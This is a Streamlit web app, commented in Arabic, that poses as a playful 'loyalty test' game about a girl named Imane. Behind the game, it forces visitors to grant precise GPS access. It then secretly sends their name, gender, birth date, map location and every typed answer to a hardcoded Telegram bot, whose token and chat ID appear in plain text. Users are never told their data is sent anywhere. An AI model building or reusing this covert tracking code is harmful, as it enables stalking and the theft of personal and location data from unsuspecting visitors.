from datetime import date
import json
import re
import urllib.parse
import urllib.request
import urllib.error
import streamlit as st
import streamlit.components.v1 as components

# ضبط إعدادات الصفحة
st.set_page_config(page_title="takotaki 🌸", page_icon="🥀", layout="centered")

# --- إخفاء شريط Streamlit السفلي والعلوي بالكامل ---
st.markdown(
    """
    <style>
        footer {display: none !important; visibility: hidden !important;}
        .stAppFooter {display: none !important; visibility: hidden !important;}
        [data-testid="stFooter"] {display: none !important; visibility: hidden !important;}
        [data-testid="stHeader"] {display: none !important; visibility: hidden !important;}
        #MainMenu {display: none !important; visibility: hidden !important;}
        header {display: none !important; visibility: hidden !important;}
        div[class*="viewerBadge"] {display: none !important; visibility: hidden !important;}
        .viewerBadge_container__1QSob {display: none !important; visibility: hidden !important;}
        [data-testid="stDecoration"] {display: none !important;}
        [data-testid="stStatusWidget"] {display: none !important;}
        [data-testid="stToolbar"] {display: none !important;}
    </style>
    """,
    unsafe_allow_html=True,
)

# تهيئة متغيرات الجلسة
if "step" not in st.session_state:
    st.session_state.step = 1
if "visitor_name" not in st.session_state:
    st.session_state.visitor_name = ""
if "visitor_gender" not in st.session_state:
    st.session_state.visitor_gender = "Boy 👦"
if "visitor_dob" not in st.session_state:
    st.session_state.visitor_dob = ""
if "attempts" not in st.session_state:
    st.session_state.attempts = 0

# قراءة الإحداثيات مباشرة من رابط الصفحة إذا تم تمريرها
params = st.query_params
if "lat" in params and "lon" in params:
    st.session_state.user_location_link = f"https://www.google.com/maps?q={params['lat']},{params['lon']}"
elif "user_location_link" not in st.session_state:
    st.session_state.user_location_link = "لم يتم تفعيل GPS"


# دالة إرسال التنبيهات إلى تيليغرام
def send_telegram_msg(text_message):
    token = "8792751826:AAF4UuvvBVAQWNRsdL7li3R8s0BS8a1_obo"
    chat_id = "8745436619"

    if "bot_token" in st.secrets:
        token = st.secrets["bot_token"]
    elif "TELEGRAM_BOT_TOKEN" in st.secrets:
        token = st.secrets["TELEGRAM_BOT_TOKEN"]

    if "chat_id" in st.secrets:
        chat_id = st.secrets["chat_id"]
    elif "TELEGRAM_CHAT_ID" in st.secrets:
        chat_id = st.secrets["TELEGRAM_CHAT_ID"]

    bot_token = str(token).strip()
    target_chat_id = str(chat_id).strip()

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = json.dumps({"chat_id": target_chat_id, "text": text_message}).encode("utf-8")

    try:
        req = urllib.request.Request(
            url, data=payload, headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            return True, "تم الإرسال بنجاح"
    except urllib.error.HTTPError as e:
        err_response = e.read().decode("utf-8")
        return False, f"خطأ من تيليغرام ({e.code}): {err_response}"
    except Exception as e:
        return False, f"خطأ اتصال: {str(e)}"


# التحقق من الأسماء
def is_legally_allowed_in_morocco(name: str) -> bool:
    clean_name = name.strip().lower()
    if clean_name in ["mark", "marc", "مارك"]:
        return True

    moroccan_names_latin = {
        "imane", "iman", "eman", "youssef", "yousef", "mohamed", "mohammed",
        "muhammad", "simohamed", "mehdi", "el mehdi", "amine", "hamza", "omar",
        "reda", "zakaria", "zakariya", "ayman", "aymane", "adam", "rayan",
        "rayane", "othmane", "otman", "anass", "anas", "khalid", "hassan",
        "houssain", "soufiane", "tariq", "tarik", "walid", "bilal", "badr",
        "salma", "sara", "sarah", "hajar", "hajer", "aya", "fatima", "zohra",
        "khadija", "laila", "layla", "meriem", "meryem", "noha", "nouhaila",
        "chaimae", "chaimaa", "kenza", "yasmine", "ghita", "houda", "soundous",
        "wiam", "ikram", "nada", "kaoutar", "kawtar", "asmae", "asma", "nour",
        "noor", "manal", "soukaina", "soukayna", "douae", "douaa", "marwa",
        "marouan", "marouane", "driss", "yassine", "yassin", "nabil", "nizar",
        "faysal", "rachid", "aziz", "said", "mustapha", "karim", "brahim",
        "ibrahim", "achraf", "mounir", "houssam", "hicham", "kamal", "fouad",
        "jamal", "ismail", "ilias", "ilyas", "saad", "souad", "nawal", "rabab",
        "bouchra", "siham", "hanane", "najat", "latifa", "malika", "samira",
        "loubna", "mina", "rachida"
    }

    if clean_name in moroccan_names_latin:
        return True

    if re.search(r"[\u0600-\u06FF]", clean_name):
        blocked_foreign_arabic = [
            "جون", "ديفيد", "مايكل", "أليكس", "ستيفن", "روبرت", "ويليام", "توماس", "ألكسندر", "جورج"
        ]
        if clean_name in blocked_foreign_arabic:
            return False
        return True

    return False


# --- الخطوة الأولى: إدخال البيانات والتأكد الإجباري من تفعيل الخريطة ---
if st.session_state.step == 1:
    st.markdown(
        """
        <style>
            [data-testid="stAppViewContainer"] {
                background: linear-gradient(135deg, #2b0015, #0d0006) !important;
                color: #ffffff;
            }
            .welcome-title {
                text-align: center;
                font-size: 32px;
                font-weight: bold;
                color: #ff4d6d;
                text-shadow: 0 0 15px rgba(255, 77, 109, 0.8);
                margin-bottom: 25px;
            }
            .stTextInput > div > div > input, .stDateInput > div > div > input {
                background-color: #1a000c !important;
                color: #ffffff !important;
                border: 2px solid #ff2a6d !important;
                border-radius: 12px;
            }
            div[data-baseweb="radio"] label { color: #ffffff !important; }
            .stButton > button {
                background: linear-gradient(135deg, #ff0055, #ff2a6d) !important;
                color: white !important;
                border-radius: 12px !important;
                border: none !important;
                width: 100%;
                font-size: 18px !important;
                font-weight: bold !important;
                padding: 10px !important;
            }
            .location-box {
                background: rgba(255, 0, 85, 0.15);
                border: 2px dashed #ff0055;
                border-radius: 15px;
                padding: 15px;
                text-align: center;
                margin-bottom: 20px;
            }
            .location-status-active {
                color: #00ff88;
                font-weight: bold;
                margin-top: 8px;
            }
            .location-status-pending {
                color: #ff4d6d;
                font-weight: bold;
                margin-top: 8px;
            }
        </style>
        """,
        unsafe_allow_html=True,
    )
    st.markdown(
        '<div class="welcome-title">✨ Welcome to takotaki! ✨</div>',
        unsafe_allow_html=True,
    )

    is_gps_active = "google.com/maps" in st.session_state.user_location_link
    status_msg = (
        '<div class="location-status-active">✅ تم تفعيل الخريطة وتحديد موقعك بنجاح!</div>'
        if is_gps_active
        else '<div class="location-status-pending">⚠️ الخريطة غير مفعلة! اضغط الزر بالأسفل لتفعيل GPS.</div>'
    )

    st.markdown(
        f"""
        <div class="location-box">
            <h4 style="margin:0; color:#ff4d6d;">📍 شرط تشغيل الموقع</h4>
            <p style="font-size:14px; margin-top:5px; color:#ddd;">يرجى تفعيل الخريطة (GPS) على جهازك والموافقة على التحديد لفتح المتابعة.</p>
            {status_msg}
        </div>
        """,
        unsafe_allow_html=True,
    )

    # مكون تفعيل الموقع الجغرافي عبر إعادة التوجيه الفوري
    loc_html = """
    <script>
    function requestLocation() {
        if (!navigator.geolocation) {
            alert("⚠️ خاصية التحديد غير مدعومة في متصفحك.");
            return;
        }
        navigator.geolocation.getCurrentPosition(
            function(position) {
                var lat = position.coords.latitude;
                var lon = position.coords.longitude;
                var currentUrl = window.top.location.href.split('?')[0];
                window.top.location.href = currentUrl + "?lat=" + lat + "&lon=" + lon;
            },
            function(error) {
                if (error.code == error.PERMISSION_DENIED) {
                    alert("🚫 تم رفض الاذن! يرجى السماح للمتصفح بالوصول للموقع من إعدادات الهاتف ثم إعادت الضغط على الزر.");
                } else {
                    alert("⚠️ تعذر تحديد الموقع، يرجى التأكد من تشغيل الـ GPS في الهاتف.");
                }
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }
    </script>
    <div style="text-align: center;">
        <button onclick="requestLocation()" style="background: linear-gradient(135deg, #00c853, #b2ff59); color: #000; border: none; padding: 14px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 0 10px rgba(0,200,83,0.5);">
            🌐 اضغط هنا لتشغيل الخريطة والموافقة على الموقع 📍
        </button>
    </div>
    """
    components.html(loc_html, height=70)

    with st.form("user_info_form"):
        name_in = st.text_input("Enter Your Name:", placeholder="Type your name here...")
        gender_in = st.radio("Select Your Gender:", ["Boy 👦", "Girl 👧"], horizontal=True)
        dob_in = st.date_input(
            "Select Your Date of Birth:",
            min_value=date(1950, 1, 1),
            max_value=date.today(),
            value=date(2000, 1, 1),
        )

        submit_btn = st.form_submit_button("Continue ➔")

        if submit_btn:
            name_val = name_in.strip()
            if not name_val:
                st.warning("Please enter your name first!")
            elif "google.com/maps" not in st.session_state.user_location_link:
                st.error("🚫 عذراً! لن يعمل الموقع حتى تقوم بالضغط على الزر الأخضر والسماح بالـ GPS أولاً!")
            elif not is_legally_allowed_in_morocco(name_val):
                st.error("⚠️ This name cannot be entered, please try again!")
            else:
                st.session_state.visitor_name = name_val
                st.session_state.visitor_gender = gender_in
                st.session_state.visitor_dob = str(dob_in)

                msg = (
                    f"🚨 دخول زائر جديد!\n"
                    f"👤 الاسم: {name_val}\n"
                    f"🚻 الجنس: {gender_in}\n"
                    f"🎂 الميلاد: {dob_in}\n"
                    f"📍 رابط الخريطة (GPS): {st.session_state.user_location_link}"
                )
                success, err_msg = send_telegram_msg(msg)

                if not success:
                    st.error(f"⚠️ تنبيه البوت: {err_msg}")
                else:
                    st.session_state.step = 2
                    st.rerun()

# --- الخطوة الثانية: السؤال الرئيسي وتفعيل الأغاني والمؤثرات ---
elif st.session_state.step == 2:
    ALLOWED_NAMES = ["imane", "iman", "eman"]

    st.markdown(
        """
        <style>
            [data-testid="stAppViewContainer"] {
                background: linear-gradient(135deg, #2b0015, #0d0006) !important;
                color: #ffffff;
            }
            .stTextInput > div > div > input {
                background-color: #1a000c !important;
                color: #ff4d6d !important;
                border: 2px solid #ff0055 !important;
                border-radius: 12px;
                text-align: center;
                font-size: 20px;
                box-shadow: 0 0 15px rgba(255, 0, 85, 0.4);
            }
            .main-title {
                text-align: center;
                font-size: 32px;
                font-weight: bold;
                color: #ff4d6d;
                text-shadow: 0 0 20px rgba(255, 77, 109, 0.8);
                margin-bottom: 25px;
            }
            .stButton > button {
                background: linear-gradient(135deg, #ff0055, #ff2a6d) !important;
                color: white !important;
                border-radius: 12px !important;
                border: none !important;
                width: 100%;
                font-size: 18px !important;
                font-weight: bold !important;
                padding: 12px !important;
                margin-top: 10px;
            }
        </style>
        <div class="main-title">🥀 takotaki: A Secret Test For Your Loyalty... 👁️</div>
        """,
        unsafe_allow_html=True,
    )

    user_input = st.text_input(
        "",
        placeholder="Who is the only girl in your mind now?...",
        key="loyalty_input",
    )
    check_btn = st.button("Reveal Loyalty Result ✨")

    if check_btn:
        if not user_input.strip():
            st.warning("Please write a name first!")
        else:
            clean_name = user_input.strip().lower()
            st.session_state.attempts += 1

            msg = (
                f"🎯 إجابة جديدة!\n"
                f"👤 الاسم: {st.session_state.visitor_name}\n"
                f"✍️ الإجابة المدخلة: {user_input}\n"
                f"🔢 المحاولات: {st.session_state.attempts}\n"
                f"📍 الخريطة: {st.session_state.user_location_link}"
            )
            success, err_msg = send_telegram_msg(msg)

            if not success:
                st.error(f"⚠️ تنبيه البوت: {err_msg}")

            if clean_name in ALLOWED_NAMES:
                st.markdown(
                    """
                    <audio autoplay loop style="display:none;">
                        <source src="https://cdn.pixabay.com/audio/2022/05/27/audio_1808fbf07a.mp3" type="audio/mp3">
                    </audio>
                    """,
                    unsafe_allow_html=True,
                )

                st.markdown(
                    """
                    <style>
                        @keyframes roseFall {
                            0% { transform: translateY(-10vh) rotate(0deg) scale(0.8); opacity: 1; }
                            100% { transform: translateY(105vh) rotate(360deg) scale(1.3); opacity: 0.2; }
                        }
                        .rose {
                            position: fixed;
                            top: -50px;
                            font-size: 32px;
                            animation-name: roseFall;
                            animation-timing-function: linear;
                            animation-iteration-count: infinite;
                            z-index: 99999;
                            pointer-events: none;
                        }
                    </style>
                    <div class="rose" style="left:5%; animation-duration:5s; animation-delay:0s;">🌹</div>
                    <div class="rose" style="left:18%; animation-duration:7s; animation-delay:1s;">🌹</div>
                    <div class="rose" style="left:32%; animation-duration:6s; animation-delay:0.5s;">🌹</div>
                    <div class="rose" style="left:48%; animation-duration:8s; animation-delay:2s;">🌹</div>
                    <div class="rose" style="left:62%; animation-duration:5.5s; animation-delay:1.5s;">🌹</div>
                    <div class="rose" style="left:78%; animation-duration:6.5s; animation-delay:0.2s;">🌹</div>
                    <div class="rose" style="left:90%; animation-duration:7.5s; animation-delay:2.5s;">🌹</div>
                    """,
                    unsafe_allow_html=True,
                )

                HELLO_KITTY_KISS_GIF = "https://media.giphy.com/media/MDJ9IbxxvDUQM/giphy.gif"

                if "Girl" in st.session_state.visitor_gender:
                    st.markdown(
                        f"""
                        <style>
                            [data-testid="stAppViewContainer"] {{
                                background: radial-gradient(circle, #3d001e 0%, #15000a 100%) !important;
                                width: 100vw !important;
                                min-height: 100vh !important;
                            }}
                            .card-3d {{
                                background: rgba(30, 0, 15, 0.85) !important;
                                backdrop-filter: blur(15px);
                                border-radius: 25px;
                                padding: 30px;
                                text-align: center;
                                border: 2px solid #ff4d6d;
                                box-shadow: 0 0 40px rgba(255, 77, 109, 0.6);
                            }}
                            .card-header {{
                                font-size: 30px;
                                font-weight: bold;
                                color: #ff4d6d !important;
                                text-shadow: 0 0 15px rgba(255, 77, 109, 0.9);
                                margin-bottom: 15px;
                            }}
                            .card-body-text {{ font-size: 19px; line-height: 1.7; font-weight: 600; color: #ffffff; }}
                            .hk-kiss-img {{
                                width: 180px;
                                margin-top: 15px;
                                filter: drop-shadow(0 0 15px #ff4d6d);
                                animation: floatHK 3s ease-in-out infinite alternate;
                            }}
                            @keyframes floatHK {{
                                0% {{ transform: translateY(0px) scale(1); }}
                                100% {{ transform: translateY(-10px) scale(1.05); }}
                            }}
                        </style>
                        <div class="card-3d">
                            <div class="card-header">💖 Best Girl! You Passed The Test! 💖</div>
                            <div class="card-body-text">
                                🌸 You remembered your most amazing best friend & sister: <b>IMANE</b>! 🌸<br><br>
                                You are such an incredible girl, the absolute best sister, and the most wonderful friend anyone could ever ask for! 👑✨<br><br>
                                💐 Thank you for being so genuine, supportive, and truly sweet! Pure sisterhood and forever friendship! 🎀👯‍♀️💖
                            </div>
                            <img src="{HELLO_KITTY_KISS_GIF}" class="hk-kiss-img" alt="Hello Kitty Kiss">
                        </div>
                        """,
                        unsafe_allow_html=True,
                    )
                else:
                    st.markdown(
                        f"""
                        <style>
                            [data-testid="stAppViewContainer"] {{
                                background: radial-gradient(circle, #3d001e 0%, #15000a 100%) !important;
                                width: 100vw !important;
                                min-height: 100vh !important;
                            }}
                            .card-3d {{
                                background: rgba(30, 0, 15, 0.85) !important;
                                backdrop-filter: blur(15px);
                                border-radius: 25px;
                                padding: 30px;
                                text-align: center;
                                border: 2px solid #ff4d6d;
                                box-shadow: 0 0 40px rgba(255, 77, 109, 0.6);
                            }}
                            .card-header {{
                                font-size: 30px;
                                font-weight: bold;
                                color: #ff4d6d !important;
                                text-shadow: 0 0 15px rgba(255, 77, 109, 0.9);
                                margin-bottom: 15px;
                            }}
                            .card-body-text {{ font-size: 19px; line-height: 1.7; font-weight: 600; color: #ffffff; }}
                            .hk-kiss-img {{
                                width: 180px;
                                margin-top: 15px;
                                filter: drop-shadow(0 0 15px #ff4d6d);
                                animation: floatHK 3s ease-in-out infinite alternate;
                            }}
                            @keyframes floatHK {{
                                0% {{ transform: translateY(0px) scale(1); }}
                                100% {{ transform: translateY(-10px) scale(1.05); }}
                            }}
                        </style>
                        <div class="card-3d">
                            <div class="card-header">✨ Good Boy! You Passed The Test! ✨</div>
                            <div class="card-body-text">
                                🌸 You remembered the only queen: <b>IMANE</b>! 🌸<br><br>
                                She is the light in every darkness, the blooming rose in every garden, 
                                and the only dream this heart will ever chase. 👑✨<br><br>
                                💋 Sending you endless roses and sweet affection! You are a loyal, good boy! 🌹💕
                            </div>
                            <img src="{HELLO_KITTY_KISS_GIF}" class="hk-kiss-img" alt="Hello Kitty Kiss">
                        </div>
                        """,
                        unsafe_allow_html=True,
                    )

            else:
                st.markdown(
                    """
                    <audio autoplay loop style="display:none;">
                        <source src="https://cdn.pixabay.com/audio/2021/08/09/audio_884334c480.mp3" type="audio/mp3">
                    </audio>
                    """,
                    unsafe_allow_html=True,
                )

                RAIN_3D_ANIMATED = "https://i.gifer.com/7SdO.gif"
                warnings = [
                    "🥺 What a failure... Are you sure about that? Think carefully!",
                    "🤨 Who is that?! You completely failed the test... Try again!",
                    "💔 Total disappointment! Wrong answer... You failed so badly!",
                    "🔥 LAST CHANCE! Such a failure... Type the RIGHT name now!",
                ]
                msg_idx = min(st.session_state.attempts - 1, len(warnings) - 1)
                current_warning = warnings[msg_idx]

                st.markdown(
                    f"""
                    <style>
                        [data-testid="stAppViewContainer"] {{
                            background: #05020a url('{RAIN_3D_ANIMATED}') center center / cover no-repeat fixed !important;
                            width: 100vw !important;
                            min-height: 100vh !important;
                        }}
                        .sad-box-3d {{
                            background: rgba(10, 2, 5, 0.85) !important;
                            backdrop-filter: blur(10px);
                            color: #ff4d6d;
                            padding: 30px;
                            border-radius: 20px;
                            text-align: center;
                            border: 2px solid #ff0055;
                            box-shadow: 0 0 40px rgba(255, 0, 85, 0.7);
                            font-size: 22px;
                            font-weight: bold;
                            margin-top: 20px;
                        }}
                    </style>
                    <div class="sad-box-3d">
                        {current_warning}
                    </div>
                    """,
                    unsafe_allow_html=True,
                )
